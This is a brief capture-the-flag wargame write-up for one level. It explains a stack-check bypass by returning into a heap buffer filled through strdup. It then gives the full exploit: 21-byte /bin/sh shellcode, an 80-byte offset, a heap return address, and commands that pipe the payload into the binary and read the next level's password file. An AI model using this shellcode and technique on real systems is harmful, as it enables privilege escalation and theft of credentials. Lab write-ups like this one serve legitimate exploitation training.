thanks to http://www.ouah.org/BO-RedKod.html

level2 binary with the rights of level3

main function calls p()

p seems to check that the stack is not changed after calling gets (0xb is the stack)
so we can't simply change eip

we notice that a malloc call is done (through the strdup call)
using ltrace we notice that we always have the same return address for the strdup call
we can try and do something in the heap

shellcode 21 bytes: http://shell-storm.org/shellcode/files/shellcode-575.php

we easily find out that eip offset is 80 characters

chmod 777 . && touch exploit && chmod 777 exploit
python -c 'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "0"*59 + "\x08\xa0\x04\x08")' > exploit
cat exploit - | ./level3
cat /home/user/level3/.pass
yay it works !!!